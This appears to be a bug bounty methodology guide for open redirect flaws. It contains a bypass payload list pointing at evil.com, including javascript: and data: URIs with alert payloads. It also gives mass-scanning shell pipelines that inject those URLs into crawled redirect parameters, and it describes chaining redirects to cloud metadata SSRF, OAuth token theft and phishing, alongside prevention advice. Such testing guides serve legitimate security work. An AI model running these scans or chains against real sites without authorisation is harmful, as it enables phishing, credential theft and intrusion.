# Open Redirect

> Comprehensive open redirect testing methodology for bug bounty hunters & penetration testers (2025–2026)

## Overview

Open redirect vulnerabilities occur when a web application redirects users to arbitrary external URLs without proper validation, enabling phishing attacks, malware distribution, and trust exploitation. Based on OWASP Unvalidated Redirects and Forwards, PortSwigger Open Redirect research, and 2025–2026 trends (bypasses via encoded slashes, double encoding, URL fragments, protocol‑relative URLs, JavaScript/data URI, and chaining with SSRF, XSS, or OAuth token theft).

## Methodology

### 1. Target & Parameter Identification
- **Common vulnerable parameter names:** `redirect=`, `url=`, `next=`, `return=`, `dest=`, `destination=`, `continue=`, `goto=`, `redirecturl=`, `returnUrl=`, `forward=`, `go=`, `out=`, `uri=`, `rurl=`, `target=`, `to=`, `login?to=`, `logout=`, `next_page=`, `redirect_to=`, `redirect_uri=`, `redirect_url=`, `return_to=`, `return_url=`, `jump=`, `jump_url=`, `origin=`, `originUrl=`, `location=`, `Redirect=`, `RedirectUrl=`, `desturl=`, `u=`, `qurl=`, `rit_url=`, `site=`, `forward_to=`, `forward_url=`, `destination_url=`, `jump_to=`, `go_to=`, `goto_url=`, `target_url=`, `redirect_link=`
- **Additional input sources:** HTTP headers (`Referer`, `X‑Forwarded‑Host`), Cookies (if used for redirect), JSON/XML API responses, OAuth `state`/`redirect_uri` parameters, SAML `RelayState`, JWT `redirect` claims
- **Context detection:** 3xx HTTP status codes (301, 302, 307, 308), `Location` header, meta refresh, JavaScript `window.location`, `document.location`, `history.pushState`

### 2. Bypass Techniques (2025–2026)
- **Encoded slashes:** `%2f`, `%5c`, `%252f`, `%255c`
- **Double encoding:** `%25252f`, `%25255c`
- **URL fragments:** `https://target.com/redirect?url=https://evil.com#@target.com`
- **Protocol‑relative URLs:** `//evil.com`, `///evil.com`, `////evil.com`
- **Hostname injection:** `target.com@evil.com`, `target.com%40evil.com`
- **Whitespace variants:** `%09`, `%0a`, `%0d`, `%20`
- **Data/JavaScript URIs:** `data:text/html,<meta http‑equiv="refresh" content="0;url=https://evil.com">`, `javascript:window.location='https://evil.com'`
- **Unicode/IDN homoglyphs:** `evil․com` (U+2024), `evilⓒⓞⓜ`
- **Redirect chain via trusted domains:** `https://target.com/redirect?url=https://trusted.com/redirect?url=https://evil.com`

### 3. Chained Exploitation
- **Open redirect → SSRF:** Redirect to internal IPs (127.0.0.1, 169.254.169.254)
- **Open redirect → XSS:** Redirect to JavaScript URI or data URI with XSS payload
- **Open redirect → OAuth token theft:** `redirect_uri` hijacking in OAuth flows
- **Open redirect → phishing:** Clone legitimate login page, harvest credentials

## Tool Installation

```bash
# Core reconnaissance & fuzzing tools
go install github.com/ffuf/ffuf@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Parameter discovery & manipulation
go install github.com/tomnomnom/gf@latest
go install github.com/tomnomnom/qsreplace@latest
go install github.com/tomnomnom/uro@latest

# Open‑redirect‑specific tools
git clone https://github.com/iam‑thefrogy/OpenRedireX.git  # Python‑based open redirect fuzzer
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git  # Payload collection
```

## Testing Commands

### 1. Payload Generation

```bash
# Create payloads file with 2025–2026 bypasses
cat > redirect-payloads.txt << EOF
//evil.com
///evil.com
////evil.com
target.com@evil.com
/%2f%2fevil.com
/%68%74%74%70%3a%2f%2fevil.com
//%09evil.com
/%5cevil.com
https://evil.com/%2f..
////evil.com/%2e%2e
/https://evil.com
evil.com//
https://%09evil.com
data:text/html,<a href="https://evil.com">Click</a>
javascript:window.location='https://evil.com'
https://evil.com#@target.com
https://evil.com%23@target.com
https://evil.com%2523@target.com
https://evil.com%25252f%25252fevil.com
https://evil.com%25255cevil.com
https://evil.com%3F@target.com
https://evil.com%253F@target.com
https://evil.com%09@target.com
https://evil.com%0a@target.com
https://evil.com%0d@target.com
https://evil.com%20@target.com
https://evil.com%2e%2e%2ftarget.com
https://evil.com%252e%252e%252ftarget.com
https://evil.com?next=https://evil.com
https://evil.com/redirect?url=https://evil.com
https://evil.com/redirect?url=https%3A%2F%2Fevil.com
https://evil.com/redirect?url=//evil.com
https://evil.com/redirect?url=%2F%2Fevil.com
https://evil.com/redirect?url=%252F%252Fevil.com
https://evil.com/redirect?url=data:text/html,<script>alert(1)</script>
https://evil.com/redirect?url=javascript:alert(document.domain)
EOF
```

### 2. Parameter Discovery & Enumeration

```bash
# GF pattern matching for redirect parameters
cat crawledurls.txt | gf redirect | uro | sort -u | tee redirect-params.txt  # Extract redirect‑related URLs

# Custom pattern for additional redirect parameters
grep -E "(redirect=|url=|next=|return=|dest=|destination=|continue=|goto=|redirecturl=|returnUrl=|forward=|go=|out=|uri=|rurl=|target=|to=|login\?to=|logout=|next_page=|redirect_to=|redirect_uri=|redirect_url=|return_to=|return_url=|jump=|jump_url=|origin=|originUrl=|location=|Redirect=|RedirectUrl=|desturl=|u=|qurl=|rit_url=|site=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=)" crawledurls.txt | anew redirect-params-additional.txt

# Extract from JavaScript files
cat livejslinks.txt | xargs -I@ curl -s @ | grep -Eo "(var|let|const)\s+\w+\s*=\s*['\"].*?['\"]" | cut -d'=' -f2 | tr -d " '\"" | grep -E "(redirect|url|next|return|dest|destination|continue|goto)" | sort -u > js-redirect-params.txt
```

### 3. Basic Detection Probes

```bash
# Test with simple external domain
cat redirect-params.txt | qsreplace "https://evil.com" | httpx -silent -status-code -location -match-string "evil.com" | tee redirect-basic-hits.txt

# Test with protocol‑relative payload
cat redirect-params.txt | qsreplace "//evil.com" | httpx -silent -status-code -location -match-string "evil.com" | tee redirect-protocol-hits.txt

# Test with encoded slashes
cat redirect-params.txt | qsreplace "/%2f%2fevil.com" | httpx -silent -status-code -location -match-string "evil.com" | tee redirect-encoded-hits.txt
```

### 4. Advanced Bypass Testing

```bash
# Iterate through payloads file
cat redirect-params.txt | while read -r param_url; do
  while read -r payload; do
    echo "${param_url}${payload}"
  done < redirect-payloads.txt
done | grep -E "(evil\.com|g[0-9]+\.evil\.com)" | sort -u | httpx -silent -status-code -location -ports 80,443 > redirect-advanced-tests.txt

# Alternative mass testing with sed replacement
cat crawledurls.txt | sed -E 's#(redirect=|url=|next=|return=|dest=|destination=|continue=|goto=|redirecturl=)[^&]*#\1https://evil.com#gI' | httpx -silent -mc 301,302,307,308 -location | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=" | tee redirect-params-alt.txt
```

### 5. Automated Scanning with Nuclei

```bash
# Scan with nuclei open‑redirect templates
nuclei -u https://target.com -t ~/nuclei-templates/open-redirect/ -o nuclei-open-redirect.txt

# Use nuclei with custom payloads
nuclei -u https://target.com -t ~/nuclei-templates/open-redirect/ -var redirect-url="https://evil.com" -o nuclei-custom.txt
```

### 6. Wayback + Nuclei Integration

```bash
# Extract historical URLs from Wayback Machine and test for open redirect
cat alive-domains.txt | httprobe | tee live-domains.txt | waybackurls | sort -u | grep "?" | tee open.txt | nuclei -l open.txt -t open-redirect
```

### 7. Quick Redirect Test

```bash
# Fast test with httpx‑toolkit (if available)
cat redirect-params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
```

### 8. OAuth‑Specific Redirect Testing

```bash
# OAuth redirect_uri parameter testing
grep -E "redirect_uri=" crawledurls.txt | qsreplace "https://evil.com" | httpx -silent -status-code -location -match-string "evil.com" | tee oauth-redirect-hits.txt

# OAuth state parameter tampering (if used for redirect)
grep -E "state=" crawledurls.txt | qsreplace "https://evil.com" | httpx -silent -status-code -location -match-string "evil.com" | tee oauth-state-hits.txt
```

## Advanced Techniques & Bypasses (2025–2026 Trends)

- **Double‑encoding bypass:** `%25252f`, `%25255c`, `%25253a`
- **URL parser discrepancies:** Missing `//`, using `\\`, `@` placement, fragment confusion
- **Unicode homoglyph attacks:** IDN variants of trusted domains
- **JavaScript/data URI:** `javascript:window.location`, `data:text/html;base64,...`
- **Redirect chain bypass:** Use intermediate trusted domain (e.g., GitHub Pages, CloudFlare Workers)
- **Browser‑specific behavior:** Chrome vs Firefox vs Safari URL parsing differences
- **WAF evasion:** Mixed‑case parameter names, extra query parameters, redundant slashes

## Detection & Verification

- **3xx HTTP status code** (301, 302, 307, 308) with `Location` header pointing to external domain
- **Meta refresh** `<meta http‑equiv="refresh" content="0;url=https://evil.com">`
- **JavaScript redirect** `window.location`, `document.location`, `history.pushState`
- **Response body analysis** for redirect‑related strings (`redirecting`, `you are being redirected`)
- **PoC:** Screenshot of redirected page, network traffic capture, phishing impact demonstration

## Prevention (Developer View – OWASP Latest)

1. **Avoid redirects based on user input** – use internal identifiers instead of full URLs
2. **Strict allow‑list validation** – only permit known, trusted domains
3. **Canonicalize & parse URLs** before validation (use standard library, not regex)
4. **Relative URLs only** – enforce same‑origin redirects
5. **User confirmation** for external redirects (warning banner)
6. **OAuth `redirect_uri` strict matching** – exact string match, no wildcards
7. **Security headers** – `Referrer‑Policy: strict‑origin‑when‑cross‑origin`
8. **Regular testing** – include open redirect checks in CI/CD pipelines

## References

- **OWASP Unvalidated Redirects and Forwards Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
- **PortSwigger Open Redirect Research**: https://portswigger.net/web‑security/redirect‑based‑vulnerabilities
- **PayloadsAllTheThings – Open Redirect**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
- **2025–2026 write‑ups**: Bypass techniques, chained exploits (Bugcrowd, HackerOne, Intigriti)

> **Happy (ethical) hunting** — open redirects remain a common low‑hanging fruit with high impact when chained with other vulnerabilities!